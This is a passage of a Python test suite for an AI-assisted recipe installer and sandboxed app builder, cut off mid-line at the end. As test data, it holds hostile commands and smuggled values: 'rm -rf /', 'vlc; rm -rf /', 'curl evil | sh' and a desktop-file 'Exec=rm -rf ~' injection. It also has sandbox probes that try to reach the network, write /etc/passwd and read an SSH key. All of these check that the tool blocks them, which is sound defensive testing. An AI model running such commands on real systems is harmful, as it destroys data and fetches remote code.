# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 Diamond Rubinny (d.Ai)
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from dai_tune.context import Context
from dai_tune.planner import build_plan

from dai_forge import ai, apps, intent, paths, recipes

BUILTIN = Path(__file__).resolve().parents[1] / "data" / "recipes"


class ForgeTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        base = Path(self.tmp.name)
        self.env = mock.patch.dict(os.environ, {
            "XDG_DATA_HOME": str(base / "data"),
            "DAI_APPS_DIR": str(base / "Apps"),
            "HOME": str(base / "home"),
        })
        self.env.start()
        (base / "home").mkdir()
        self.dirs = {"admin": base / "admin", "builtin": BUILTIN, "user": base / "data/dai/forge/recipes"}
        self.ctx = Context(root=base / "root", home=base / "home", runner=lambda argv: None, lang="en")

    def tearDown(self):
        self.env.stop()
        self.tmp.cleanup()

    def library(self):
        return recipes.load_library(self.dirs)


def recipe_json(**overrides):
    data = {
        "format": 1,
        "id": "demo",
        "name": {"en": "Demo", "he": "הדגמה"},
        "match": {"en": ["demo thing"]},
        "steps": [{"action": "packages.install", "params": {"names": ["hello"]}}],
    }
    data.update(overrides)
    return data


class RecipeTests(ForgeTestCase):
    def test_builtin_recipes_are_valid_plans(self):
        library = self.library()
        self.assertEqual(library.problems, [])
        self.assertGreaterEqual(set(library.recipes), {"antivirus", "flathub", "syncthing", "telegram", "vscode"})
        for recipe in library.recipes.values():
            with self.subTest(recipe=recipe.id):
                self.assertEqual(recipe.source, "builtin")
                self.assertIn("he", recipe.name)
                plan = build_plan(recipes.install_requests(recipe), self.ctx)
                self.assertTrue(plan.ok, plan.errors)
                removal = recipes.remove_requests(recipe)
                if removal:
                    self.assertTrue(build_plan(removal, self.ctx).ok)

    def test_antivirus_recipe_hardens_and_reverses(self):
        recipe = self.library().recipes["antivirus"]
        actions = [r.action for r in recipes.install_requests(recipe)]
        self.assertEqual(actions, ["packages.install", "service.unit", "antivirus.schedule"])
        removal = recipes.remove_requests(recipe)
        self.assertEqual([r.action for r in removal], ["antivirus.schedule", "service.unit", "packages.remove"])
        self.assertFalse(removal[0].params["enabled"])
        self.assertTrue(build_plan(removal, self.ctx).weakens)  # stopping scans is flagged

    def test_syncthing_ports_are_lan_only(self):
        recipe = self.library().recipes["syncthing"]
        plan = build_plan(recipes.install_requests(recipe), self.ctx)
        ports = [s.params for s in plan.steps if s.action == "firewall.open_port"]
        self.assertTrue(ports and all(p["source"] == "lan" for p in ports))
        self.assertTrue(plan.weakens)  # opening ports needs a typed "yes"

    def test_validation(self):
        self.assertEqual(recipes.validate(recipe_json()).id, "demo")
        bad = [
            {"format": 2}, {"id": "Bad ID"}, {"id": "../x"}, {"extra": 1}, {"steps": []},
            {"steps": [{"action": "shell.run", "params": {"cmd": "rm -rf /"}}]},
            {"steps": [{"action": "preset.public", "params": {}}]},
            {"steps": [{"action": "packages.install"}]},
            {"name": {"en": "x\ny"}}, {"name": {"fr": "x"}}, {"match": {"en": ["x" * 41]}},
        ]
        for override in bad:
            with self.subTest(override=override), self.assertRaises(recipes.RecipeError):
                recipes.validate(recipe_json(**override))

    def test_params_are_validated_by_the_planner(self):
        recipe = recipes.validate(recipe_json(steps=[
            {"action": "packages.install", "params": {"names": ["vlc; rm -rf /"]}},
        ]))
        plan = build_plan(recipes.install_requests(recipe), self.ctx)
        self.assertFalse(plan.ok)

    def test_windows_refugee_recipes_match_real_requests(self):
        cases = {
            "install steam": "steam", "תתקין משחקים": "steam", "I need to run exe files": "windows-apps",
            "תתקין תוכנות ווינדוס": "windows-apps", "תתקין מדפסת": "printer", "set up my printer": "printer",
            "install openvpn": "openvpn", "vpn": "wireguard", "connect to cisco vpn": "cisco-vpn",
            "install microsoft word": "onlyoffice", "תתקין וורד": "onlyoffice", "תתקין זום": "zoom",
            "סורק": "scanner", "install discord": "discord", "תתקין ספוטיפיי": "spotify",
        }
        for text, expected in cases.items():
            with self.subTest(text=text):
                recipe, removing = recipes.find(text, self.library())
                self.assertEqual((recipe.id if recipe else None, removing), (expected, False))
        for text in ("set up a print server for the office", "a word counter", "the games my kids play"):
            with self.subTest(text=text):
                self.assertNotIn(getattr(recipes.find(text, self.library())[0], "id", None),
                                 {"printer", "onlyoffice", "steam"})

    def test_user_recipe_cannot_replace_builtin_or_admin(self):
        self.dirs["user"].mkdir(parents=True)
        evil = recipe_json(id="antivirus", steps=[{"action": "firewall.open_port", "params": {"port": 4444, "source": "any"}}])
        (self.dirs["user"] / "antivirus.json").write_text(json.dumps(evil))
        library = self.library()
        self.assertEqual(library.recipes["antivirus"].source, "builtin")
        self.assertTrue(any("takes precedence" in p for p in library.problems))

        self.dirs["admin"].mkdir()
        admin = recipe_json(id="antivirus", name={"en": "Company AV"})
        (self.dirs["admin"] / "antivirus.json").write_text(json.dumps(admin))
        self.assertEqual(self.library().recipes["antivirus"].source, "admin")

    def test_file_name_must_match_id_and_size_is_limited(self):
        self.dirs["user"].mkdir(parents=True)
        (self.dirs["user"] / "other.json").write_text(json.dumps(recipe_json()))
        (self.dirs["user"] / "big.json").write_text(" " * (recipes.MAX_FILE + 1))
        library = self.library()
        self.assertNotIn("demo", library.recipes)
        self.assertEqual(len(library.problems), 2)

    def test_save_user_recipe(self):
        recipe = recipes.validate(recipe_json(), source="ai")
        path = recipes.save_user_recipe(recipe)
        self.assertEqual(path, paths.user_recipes() / "demo.json")
        self.assertEqual(self.library().recipes["demo"].source, "user")


class IntentTests(ForgeTestCase):
    def classify(self, text, existing=()):
        return intent.classify(text, self.library(), existing)

    def test_recipes(self):
        cases = {
            "+ install antivirus": ("recipe", "antivirus"),
            "תתקין אנטי וירוס": ("recipe", "antivirus"),
            "תוסיף הגנה מפני וירוסים": ("recipe", "antivirus"),
            "add file sync between my computers": ("recipe", "syncthing"),
            "תוסיף סנכרון קבצים בין המחשבים שלי": ("recipe", "syncthing"),
            "install telegram": ("recipe", "telegram"),
            "תתקין טלגרם": ("recipe", "telegram"),
            "I want docker": ("recipe", "containers"),
            "remove antivirus": ("remove", "antivirus"),
            "הסר את האנטי וירוס": ("remove", "antivirus"),
            "uninstall vs code": ("remove", "vscode"),
        }
        for text, (kind, rid) in cases.items():
            with self.subTest(text=text):
                result = self.classify(text)
                self.assertEqual((result.kind, result.recipe.id if result.recipe else None), (kind, rid))

    def test_apps(self):
        cases = {
            "build an app for a shopping list": "gui",
            "תבנה אפליקציה לרשימת קניות": "gui",
            "תבנה אתר של מחשבון משכנתא": "web",
            "create a web page with a countdown": "web",
            "write a script that renames photos by date": "cli",
            "תכתוב סקריפט שממיין קבצים": "cli",
            "build an app that scans for viruses": "gui",  # an explicit build wins over the recipe
        }
        for text, kind in cases.items():
            with self.subTest(text=text):
                result = self.classify(text)
                self.assertEqual((result.kind, result.app_kind), ("app", kind))

    def test_edit_only_existing_apps(self):
        result = self.classify("change shopping: add a delete button", existing=["shopping"])
        self.assertEqual((result.kind, result.app_name, result.instruction), ("edit", "shopping", "add a delete button"))
        result = self.classify("שנה את shopping: הוסף כפתור מחיקה", existing=["shopping"])
        self.assertEqual((result.kind, result.instruction), ("edit", "הוסף כפתור מחיקה"))
        self.assertEqual(self.classify("change shopping: x").kind, "unknown")

    def test_unknown_and_empty(self):
        self.assertEqual(self.classify("set up a print server for the office").kind, "unknown")
        self.assertEqual(self.classify("+").kind, "empty")


GUI_CODE = """#!/usr/bin/env python3
import sys
from PyQt6.QtWidgets import QApplication, QLabel
app = QApplication(sys.argv)
label = QLabel("hi")
label.show()
sys.exit(app.exec())
"""


class AppTests(ForgeTestCase):
    def test_save_load_versions_and_undo(self):
        app, findings = apps.save("shopping", "רשימת קניות", "gui", GUI_CODE, {"network": False}, "build it")
        self.assertEqual(findings, [])
        self.assertEqual(app.version, 1)
        self.assertTrue((paths.apps_dir() / "shopping/app.py").is_file())
        self.assertTrue(paths.app_data_dir("shopping").is_dir())
        desktop = apps.desktop_file("shopping").read_text()
        self.assertIn("Exec=dai-forge app run shopping", desktop)
        self.assertIn("Name=רשימת קניות", desktop)

        app, _ = apps.save("shopping", "", "gui", GUI_CODE.replace("hi", "v2"), {"network": False}, "v2")
        self.assertEqual((app.version, apps.versions(app)), (2, [1]))
        restored = apps.undo(app)
        self.assertEqual(restored.version, 1)
        self.assertIn('QLabel("hi")', restored.code_path.read_text())
        with self.assertRaises(apps.AppError):
            apps.undo(restored)

    def test_rejects_bad_code_and_names(self):
        with self.assertRaises(apps.AppError):
            apps.save("broken", "x", "gui", "def (:\n", {})
        with self.assertRaises(apps.AppError):
            apps.save("big", "x", "cli", "x = 1\n" * 20000, {})
        for name in ["../evil", "Evil", "a", "x" * 40, "1app"]:
            with self.subTest(name=name), self.assertRaises(apps.AppError):
                apps.save(name, "x", "cli", "print(1)\n", {})
        with self.assertRaises(apps.AppError):
            apps.save("page", "x", "web", "just text", {})

    def test_static_findings(self):
        code = ("import subprocess, socket, re, shutil\nfrom urllib import request\neval('1')\nimport os\nos.system('ls')\n"
                "os.execv('/bin/sh', [])\nshutil.rmtree('/x')\nre.compile('x')\napp.exec()\n")
        whats = {f.what for f in apps.check_python(code)}
        self.assertEqual(whats, {"subprocess", "socket", "urllib", "eval()", "system()", "rmtree()"})
        self.assertTrue(any(f.network for f in apps.check_python(code)))

    def test_title_is_sanitized_for_desktop_files(self):
        app, _ = apps.save("tricky", "Nice\nExec=rm -rf ~", "cli", "print(1)\n", {})
        desktop = apps.desktop_file("tricky").read_text()
        self.assertEqual([line for line in desktop.splitlines() if line.startswith("Exec=")],
                         ["Exec=dai-forge app run tricky"])
        self.assertIn("Name=Nice Exec=rm -rf ~", desktop)  # one harmless line

    def test_permissions_need_approval(self):
        app, _ = apps.save("weather", "Weather", "gui", GUI_CODE, {"network": True})
        self.assertEqual(app.pending_permissions, ["network"])
        with self.assertRaises(apps.AppError):
            apps.run_argv(app)
        self.assertNotIn("--share-net", apps.sandbox_argv(app, {"XDG_RUNTIME_DIR": "/run/user/1000"}))
        app = apps.approve(app, ["network", "documents"])
        self.assertEqual(app.approved, {"network": True, "documents": False, "downloads": False})  # only what was requested
        self.assertIn("--share-net", apps.run_argv(app, {"XDG_RUNTIME_DIR": "/run/user/1000"}))
        # A new version that stops asking for the network loses the approval.
        app, _ = apps.save("weather", "", "gui", GUI_CODE, {"network": False})
        self.assertFalse(app.approved["network"])

    def test_sandbox_argv(self):
        app, _ = apps.save("notes", "Notes", "gui", GUI_CODE, {})
        argv = apps.sandbox_argv(app, {"XDG_RUNTIME_DIR": "/run/user/1000", "WAYLAND_DISPLAY": "wayland-0"})
        joined = " ".join(argv)
        for expected in ["--unshare-all", "--cap-drop ALL", "--new-session", "--die-with-parent", "--clearenv",
                         "--ro-bind /usr /usr", f"--ro-bind {app.directory} /app",
                         f"--bind {paths.app_data_dir('notes')} {Path.home()}",
                         "--ro-bind /run/user/1000/wayland-0 /run/user/1000/wayland-0"]:
            self.assertIn(expected, joined)
        self.assertNotIn("--setenv DISPLAY", joined)  # no X11
        self.assertEqual(argv[-3:], ["/usr/bin/python3", "-I", "/app/app.py"])
        with self.assertRaises(apps.AppError):
            apps.sandbox_argv(app, {"WAYLAND_DISPLAY": "../../tmp/x"})

    def test_web_app_csp(self):
        page = "<!doctype html><html><head><title>x</title></head><body><script>fetch('https://x')</script></body></html>"
        app, findings = apps.save("page", "Page", "web", page, {"network": True})
        self.assertTrue(any(f.network for f in findings))
        stored = app.code_path.read_text()
        self.assertIn("connect-src 'none'", stored)  # not approved yet -> blocked
        app = apps.approve(app, ["network"])
        self.assertNotIn("connect-src 'none'", app.code_path.read_text())
        self.assertEqual(apps.run_argv(app)[0], "xdg-open")
        apps.revoke(app, "network")
        self.assertEqual(app.code_path.read_text().count("connect-src 'none'"), 1)

    def test_unique_name(self):
        apps.save("timer", "T", "cli", "print(1)\n", {})
        self.assertEqual(apps.unique_name("timer"), "timer-2")
        self.assertEqual(apps.unique_name("My Timer!"), "my-timer")
        self.assertEqual(apps.unique_name("123"), "app-123")

    def test_remove(self):
        app, _ = apps.save("gone", "Gone", "cli", "print(1)\n", {})
        apps.remove(app)
        self.assertFalse(app.directory.exists())
        self.assertFalse(apps.desktop_file("gone").exists())
        self.assertFalse(paths.app_data_dir("gone").exists())


def _bwrap_works() -> bool:
    if not shutil.which("bwrap"):
        return False
    probe = subprocess.run(["bwrap", "--ro-bind", "/", "/", "--unshare-all", "true"], capture_output=True)
    return probe.returncode == 0


@unittest.skipUnless(_bwrap_works(), "bubblewrap with user namespaces is not available")
class SandboxTests(ForgeTestCase):
    PROBE = (
        "import os, socket\n"
        "print('home:', sorted(os.listdir(os.path.expanduser('~'))))\n"
        "open(os.path.expanduser('~/saved.txt'), 'w').write('ok')\n"
        "try:\n"
        "    socket.create_connection(('1.1.1.1', 80), timeout=2)\n"
        "    print('network: open')\n"
        "except OSError:\n"
        "    print('network: blocked')\n"
        "for path in ['/app/app.py', '/etc/passwd']:\n"
        "    try:\n"
        "        open(path, 'a').write('x')\n"
        "        print('writable:', path)\n"
        "    except OSError:\n"
        "        print('read-only:', path)\n"
        "print('secret visible:', os.path.exists(os.environ.get('SECRET_PATH', '/nonexistent')))\n"
    )

    def test_cli_app_is_confined(self):
        secret = Path(self.tmp.name) / "home" / ".ssh"
        secret.mkdir()
        (secret / "id_ed25519").write_text("private")
        app, _ = apps.save("probe", "Probe", "cli", self.PROBE, {})
        env = {"XDG_RUNTIME_DIR": str(Path(self.tmp.name) / "run"), "LANG": "C.UTF-8"}
        argv = apps.run_argv(app, env)
        argv[argv.index("--clearenv") + 1:argv.index("--clearenv") + 1] = []
        argv[-4:-4] = ["--setenv", "SECRET_PATH", str(secret / "id_ed25519")]
        result = subprocess.run(argv, capture_output=True, text=True, timeout=60)
        self.assertEqual(result.returncode, 0, result.stderr)
        out = result.stdout
        self.assertIn("home: []", out)  # the user's real home is not visible
        self.assertIn("network: blocked", out)
        self.assertIn("read-only: /app/app.py", out)
        self.assertIn("read-only: /etc/passwd", out)
        self.assertIn("secret visible: False", out)
        self.assertEqual((paths.app_data_dir("probe") / "saved.txt").read_text(), "ok")


class AITests(ForgeTestCase):
    @staticmethod
    def fake_chat(reply):
        calls = []

        def chat(messages, schema=None, max_tokens=512, task="general"):
            calls.append({"messages": messages, "schema": schema, "max_tokens": max_tokens, "task": task})
            yield json.dumps(reply)
        return chat, calls

    def test_generate_app_uses_code_model_and_schema(self):
        chat, calls = self.fake_chat({"name": "shopping", "title": "קניות", "network": False, "documents": False,
                                      "code": "```python\n" + GUI_CODE + "```"})
        result = ai.generate_app("רשימת קניות", "gui", chat=chat)
        self.assertEqual(calls[0]["task"], "code")
        self.assertEqual(calls[0]["schema"], ai.APP_SCHEMA)
        self.assertNotIn("```", result["code"])
        self.assertIn("PyQt6", calls[0]["messages"][0]["content"])
        self.assertIn("setAccessibleName", calls[0]["messages"][0]["content"])

    def test_edit_sends_current_code(self):
        chat, calls = self.fake_chat({"name": "x", "title": "x", "network": False, "documents": False, "code": "print(2)"})
        ai.generate_app("print two", "cli", current="print(1)\n", chat=chat)
        self.assertIn("print(1)", calls[0]["messages"][1]["content"])

    def test_truncated_reply(self):
        def chat(*args, **kwargs):
            yield '{"name": "x", "code": "unterminated'
        with self.assertRaises(ai.AIError):
            ai.generate_app("x", "gui", chat=chat)

    def test_author_recipe_only_catalog_actions(self):
        chat, calls = self.fake_chat({"id": "print-server", "name_en": "Print server", "name_he": "שרת הדפסה", "steps": [
            {"action": "packages.install", "params": {"names": ["cups"]}},
            {"action": "preset.public", "params": {}},
            {"action": "firewall.open_port", "params": {"port": 631, "source": "lan"}},
        ]})
        recipe = ai.author_recipe("set up a print server", chat=chat)
        self.assertEqual(recipe.source, "ai")
        self.assertEqual([s["action"] for s in recipe.steps], ["packages.install", "firewall.open_port"])
        enum = calls[0]["schema"]["properties"]["steps"]["items"]["properties"]["action"]["enum"]
        self.assertIn("antivirus.schedule", enum)
        self.assertFalse(any(a.startswith("preset.") for a in enum))

    def test_author_recipe_rejects_invented_actions(self):
        chat, _ = self.fake_chat({"id": "x1", "name_en": "x", "name_he": "x",
                                  "steps": [{"action": "shell.run", "params": {"cmd": "curl evil | sh"}}]})
        with self.assertRaises(ai.AIError):
            ai.author_recipe("do something", chat=chat)


if __name__ == "__main__":
    unittest.main()


try:  # the window needs PyQt6 (in the image; installed in CI)
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    from PyQt6.QtWidgets import QApplication, QLabel

    from dai_forge import gui
except ImportError:  # pragma: no cover - depends on the machine
    gui = None


@unittest.skipIf(gui is None, "PyQt6 is not installed")
class WorkshopTests(ForgeTestCase):
    """Build → test → repair (docs/EVOLVE.md). Real bubblewrap when available."""

    CRASH = "#!/usr/bin/env python3\nimport sys\nprint('starting')\nraise ValueError('no such column: price')\n"
    FIXED = "#!/usr/bin/env python3\nprint('ok')\n"

    def fake_chat(self, codes, network=False):
        calls = []

        def chat(messages, schema=None, max_tokens=512, task="general"):
            calls.append(messages[-1]["content"])
            code = codes[min(len(calls) - 1, len(codes) - 1)]
            yield json.dumps({"name": "prices", "title": "Prices", "network": network, "documents": False, "code": code})
        return chat, calls

    def test_repairs_a_crash_with_the_traceback(self):
        from dai_forge import workshop
        results = iter([workshop.TestResult("failed", "Traceback ...\nValueError: no such column: price"),
                        workshop.TestResult("passed", "ok")])
        chat, calls = self.fake_chat([self.CRASH, self.FIXED], network=True)
        stages = []
        built = workshop.build("a price list", "cli", chat=chat, tester=lambda code, kind: next(results),
                               status=lambda stage, n, test: stages.append((stage, n)))
        self.assertEqual((built.test.status, built.repairs), ("passed", 1))
        self.assertEqual(built.result["code"], self.FIXED)
        self.assertIn("no such column: price", calls[1])
        self.assertIn(self.CRASH.strip().splitlines()[-1], calls[1])  # the code to fix is sent back
        self.assertEqual(stages, [("testing", 0), ("repairing", 1), ("testing", 1)])

    def test_gives_up_after_two_repairs_and_never_gains_permissions(self):
        from dai_forge import workshop
        chat, calls = self.fake_chat([self.CRASH], network=False)
        failing = lambda code, kind: workshop.TestResult("failed", "ValueError")
        built = workshop.build("x", "cli", chat=chat, tester=failing)
        self.assertEqual((built.test.status, built.repairs, len(calls)), ("failed", 2, 3))
        chat, _ = self.fake_chat([self.CRASH, self.FIXED], network=True)
        first = {"n": 0}

        def tester(code, kind):
            first["n"] += 1
            return workshop.TestResult("failed" if first["n"] == 1 else "passed")
        # The first reply asks for no network; a repair that asks for it does not get it.
        with mock.patch.object(workshop, "generate_app", side_effect=[
                {"name": "p", "title": "P", "network": False, "documents": False, "code": self.CRASH},
                {"name": "p", "title": "P", "network": True, "documents": True, "code": self.FIXED}]):
            built = workshop.build("x", "cli", tester=tester)
        self.assertEqual((built.result["network"], built.result["documents"]), (False, False))

    def test_never_runs_without_the_sandbox(self):
        from dai_forge import workshop
        run = mock.Mock()
        with mock.patch.object(workshop.shutil, "which", return_value=None):
            result = workshop.smoke_test(self.FIXED, "cli", run=run)
        self.assertEqual(result.status, "skipped")
        run.assert_not_called()

    def test_web_pages_are_parsed_not_run(self):
        from dai_forge import workshop
        self.assertEqual(workshop.smoke_test("<!doctype html><html lang='he'><body>שלום</body></html>", "web").status, "passed")
        self.assertEqual(workshop.smoke_test("just text", "web").status, "failed")

    @unittest.skipUnless(shutil.which("bwrap"), "bubblewrap not installed")
    def test_real_sandbox(self):
        from dai_forge import workshop
        if subprocess.run(["bwrap", "--ro-bind", "/", "/", "true"], capture_output=True).returncode != 0:
            self.skipTest("bubblewrap cannot create namespaces here")
        crash = workshop.smoke_test(self.CRASH, "cli")
        self.assertEqual(crash.status, "failed")
        self.assertIn("ValueError: no such column: price", crash.detail)
        self.assertEqual(workshop.smoke_test(self.FIXED, "cli").status, "passed")
        asks = workshop.smoke_test("name = input('Name? ')\nprint('hi', name)\n", "cli")
        self.assertEqual(asks.status, "passed")
        slow = workshop.smoke_test("import time\ntime.sleep(30)\n", "gui", seconds=1)
        self.assertEqual(slow.status, "passed")
        # The test run sees no network and no home folder of the user.
        probe = ("import os, socket\nassert not os.path.exists(os.path.expanduser('~/.ssh'))\n"
                 "assert os.environ.get('DAI_SELF_TEST') == '1'\n"
                 "try:\n    socket.create_connection(('1.1.1.1', 80), timeout=2)\n    raise SystemExit('network open')\n"
                 "except OSError:\n    pass\n")
        self.assertEqual(workshop.smoke_test(probe, "cli").status, "passed", workshop.smoke_test(probe, "cli").detail)


class CrashRecordTests(ForgeTestCase):
    """A crash of a Forge app is kept for D.Ai Heal, with the error and nothing else."""

    def test_watched_run_records_a_traceback(self):
        from dai_forge import cli
        app, _ = apps.save("prices", "Prices", "cli", "print(1)\n", {})
        argv = [sys.executable, "-c", "import sys; sys.stderr.write('Traceback (most recent call last):\\nValueError: boom\\n'); sys.exit(1)"]
        with mock.patch("sys.stderr", new=io.StringIO()):
            self.assertEqual(cli.run_watched(app, argv), 1)
        report = json.loads((paths.heal_dir() / "forge-prices.json").read_text())
        self.assertEqual((report["kind"], report["name"], report["count"]), ("forge-app", "prices", 1))
        self.assertIn("ValueError: boom", report["detail"])
        self.assertEqual(oct((paths.heal_dir() / "forge-prices.json").stat().st_mode & 0o777), "0o600")
        with mock.patch("sys.stderr", new=io.StringIO()):
            cli.run_watched(app, argv)
        self.assertEqual(json.loads((paths.heal_dir() / "forge-prices.json").read_text())["count"], 2)

    def test_clean_exit_records_nothing(self):
        from dai_forge import cli
        app, _ = apps.save("ok-app", "OK", "cli", "print(1)\n", {})
        self.assertEqual(cli.run_watched(app, [sys.executable, "-c", "print('fine')"]), 0)
        self.assertFalse((paths.heal_dir() / "forge-ok-app.json").exists())


class AutomationTests(ForgeTestCase):
    """Scheduled scripts (docs/EVOLVE.md §2): rules decide when, the sandbox decides what."""

    SCRIPT = "#!/usr/bin/env python3\nprint('NOTIFY: 12 GB free')\nprint('details for the log')\n"

    def test_schedule_rules(self):
        from dai_forge.schedule import Schedule, ScheduleError, parse
        cases = {
            "כל יום ב־18:00 תמחק מההורדות קבצים ישנים": ("daily", "*-*-* 18:00:00"),
            "every day at 6pm back up my notes": ("daily", "*-*-* 18:00:00"),
            "כל בוקר תבדוק מקום בדיסק": ("daily", "*-*-* 08:00:00"),
            "every monday at 9:30 clean the downloads": ("weekly", "Mon *-*-* 09:30:00"),
            "כל יום שני ב-9 תנקה": ("weekly", "Mon *-*-* 09:00:00"),
            "כל שעה תבדוק": ("hourly", "hourly"),
            "every 30 minutes remind me to stand up": ("minutes", ""),
            "בכל כניסה תפתח את המסמכים": ("login", ""),
        }
        for text, (kind, calendar) in cases.items():
            with self.subTest(text=text):
                schedule = parse(text)
                self.assertEqual((schedule.kind, schedule.calendar), (kind, calendar))
        self.assertEqual(parse("every 30 minutes x").timer_lines(), ["OnStartupSec=30min", "OnUnitActiveSec=30min"])
        self.assertIsNone(parse("delete old files"))
        with self.assertRaises(ScheduleError):
            parse("כל 5 דקות תבדוק")
        self.assertIsNone(Schedule.from_json({"kind": "daily", "hour": 25}))
        self.assertIsNone(Schedule.from_json({"kind": "cron", "expr": "* * * * *"}))

    def test_intent(self):
        library = self.library()
        self.assertEqual(intent.classify("כל בוקר תגיד לי כמה מקום פנוי בדיסק", library).kind, "automation")
        self.assertEqual(intent.classify("build a pomodoro app that rings every 30 minutes", library).kind, "app")
        self.assertEqual(intent.classify("install antivirus with a scan every day", library).kind, "recipe")
        too_often = intent.classify("every 5 minutes check the disk", library)
        self.assertEqual((too_often.kind, too_often.schedule), ("automation", None))
        self.assertIn("15 minutes", too_often.problem)

    def test_units_install_and_remove(self):
        from dai_forge import automation
        from dai_forge.schedule import parse
        app, _ = apps.save("disk-report", "Disk report", "cli", self.SCRIPT, {"downloads": True},
                           schedule=parse("every day at 18:00").to_json())
        self.assertFalse(apps.desktop_file("disk-report").exists())  # not a menu app
        calls = []
        runner = lambda argv: (calls.append(argv), subprocess.CompletedProcess(argv, 0, "enabled\n", ""))[1]
        with self.assertRaisesRegex(apps.AppError, "not approved"):
            automation.install(app, runner)
        app = apps.approve(app, ["downloads"])
        self.assertEqual(automation.install(app, runner), "dai-auto-disk-report.timer")
        timer = (automation.unit_dir() / "dai-auto-disk-report.timer").read_text()
        service = (automation.unit_dir() / "dai-auto-disk-report.service").read_text()
        self.assertIn("OnCalendar=*-*-* 18:00:00", timer)
        self.assertIn("ExecStart=/usr/bin/dai-forge app run disk-report --background", service)
        self.assertNotIn("User=root", service)
        self.assertIn(["systemctl", "--user", "enable", "--now", "dai-auto-disk-report.timer"], calls)
        self.assertEqual([(a.name, state) for a, state in automation.listing(runner)], [("disk-report", "enabled")])
        automation.uninstall("disk-report", runner)
        self.assertFalse((automation.unit_dir() / "dai-auto-disk-report.timer").exists())
        with self.assertRaises(apps.AppError):
            apps.save("bad", "Bad", "gui", "print(1)\n", {}, schedule=parse("every day").to_json())

    def test_login_automation_has_no_timer(self):
        from dai_forge import automation
        from dai_forge.schedule import parse
        app, _ = apps.save("hello", "Hello", "cli", self.SCRIPT, {}, schedule=parse("at login say hi").to_json())
        files = automation.unit_files(app)
        self.assertEqual(list(files), ["dai-auto-hello.service"])
        self.assertIn("WantedBy=default.target", files["dai-auto-hello.service"])

    def test_background_run_notifies_logs_and_limits(self):
        from dai_forge import automation
        app, _ = apps.save("noisy", "Noisy", "cli", self.SCRIPT, {})
        shown = []
        code = "import sys\nfor i in range(6):\n    print(f'NOTIFY: message {i}')\nprint('only in the log')\n"
        self.assertEqual(automation.run_background(app, [sys.executable, "-c", code],
                                                   notify=lambda title, text: shown.append((title, text))), 0)
        self.assertEqual(shown, [("Noisy", "message 0"), ("Noisy", "message 1"), ("Noisy", "message 2")])
        log = automation.log_path("noisy").read_text()
        self.assertIn("only in the log", log)
        self.assertIn("exit 0", log)
        crash = "raise SystemExit('x') if False else (_ for _ in ()).throw(ValueError('broken'))"
        automation.run_background(app, [sys.executable, "-c", crash], notify=lambda *a: None)
        self.assertTrue((paths.heal_dir() / "forge-noisy.json").exists())  # D.Ai Heal can offer a repair

    def test_ai_rules_for_automations(self):
        messages = ai.app_messages("every morning tell me the free disk space", "automation")
        self.assertIn("UNATTENDED", messages[0]["content"])
        self.assertIn("NOTIFY: ", messages[0]["content"])
        self.assertIn("downloads", ai.APP_SCHEMA["properties"])


class WindowTests(ForgeTestCase):
    @classmethod
    def setUpClass(cls):
        cls.qt = QApplication.instance() or QApplication([])

    def setUp(self):
        super().setUp()
        patcher = mock.patch.object(gui, "load_library", lambda: recipes.load_library(self.dirs))
        patcher.start()
        self.addCleanup(patcher.stop)
        self.window = gui.ForgeWindow("en")
        self.window.admin = True
        self.addCleanup(self.window.deleteLater)

    def wait(self, timeout=10):
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            self.qt.processEvents()
            if not self.window.threads:
                self.qt.processEvents()
                return
            time.sleep(0.01)
        self.fail("background work did not finish")

    def texts(self):
        page = self.window.pages.currentWidget()
        return " ".join(label.text() for label in page.findChildren(QLabel))

    def ask(self, text):
        self.window.ask.setText(text)
        self.window.submit()

    def test_weakening_plan_needs_typed_yes_then_applies(self):
        self.ask("add file sync between my computers")
        self.assertIn("Syncthing", self.texts())
        self.assertFalse(self.window.apply_button.isEnabled())
        self.window.confirm_field.setText("maybe")
        self.assertFalse(self.window.apply_button.isEnabled())
        self.window.confirm_field.setText("yes")
        self.assertTrue(self.window.apply_button.isEnabled())
        calls = []

        def fake_apply(plan, ctx, label):
            calls.append((plan, label))
            from dai_tune.cli import ApplyResult
            return ApplyResult(True, entry_id="20260101-000000-abcdef")

        with mock.patch.object(gui, "apply_plan", fake_apply):
            self.window.apply()
            self.wait()
        self.assertEqual(len(calls), 1)
        self.assertIn("Forge:", calls[0][1])
        self.assertIn("Done", self.texts())
        self.assertEqual(self.window.last_entry, "20260101-000000-abcdef")

    def test_hardening_plan_applies_without_typing(self):
        self.ask("install antivirus")
        self.assertIsNone(self.window.confirm_field)
        self.assertTrue(self.window.apply_button.isEnabled())

    def test_non_admin_cannot_apply(self):
        self.window.admin = False
        self.ask("install antivirus")
        self.assertFalse(self.window.apply_button.isEnabled())

    def test_ai_recipe_needs_review(self):
        recipe = recipes.validate(recipe_json(), source="ai")
        self.window.show_recipe(recipe, removing=False)
        self.assertFalse(self.window.apply_button.isEnabled())
        self.window.reviewed.setChecked(True)
        self.assertTrue(self.window.apply_button.isEnabled())

    def test_failed_apply_shows_error(self):
        from dai_tune.cli import ApplyResult
        self.ask("install antivirus")
        with mock.patch.object(gui, "apply_plan", lambda *a: ApplyResult(False, "authorization cancelled")):
            self.window.apply()
            self.wait()
        self.assertIn("authorization cancelled", self.texts())

    def test_build_app_streams_code_and_asks_permissions(self):
        def fake_generate(request, kind, existing=None, chat=None, progress=None):
            reply = json.dumps({"name": "shopping", "title": "Shopping", "network": True, "documents": False, "code": GUI_CODE})
            progress(reply[: len(reply) // 2])
            return {"name": "shopping", "title": "Shopping", "network": True, "documents": False, "code": GUI_CODE}

        from dai_forge.workshop import Built, TestResult

        def fake_build(request, kind, existing=None, progress=None, status=None):
            status("testing", 0, TestResult("skipped"))
            return Built(fake_generate(request, kind, existing, progress=progress), TestResult("passed", "ok"), 1)

        with mock.patch.object(gui, "model_installed", lambda: True), \
                mock.patch.object(gui, "build", fake_build):
            self.ask("build an app for a shopping list")
            self.wait()
        self.assertEqual(self.window.app.name, "shopping")
        self.assertIn("ready", self.texts())
        self.assertIn("the AI fixed 1 problem", self.texts())
        self.assertEqual(apps.load("shopping").tested, "passed")
        self.assertEqual(list(self.window.permission_boxes), ["network"])
        with mock.patch.object(gui.subprocess, "Popen") as popen, mock.patch.object(gui.shutil, "which",
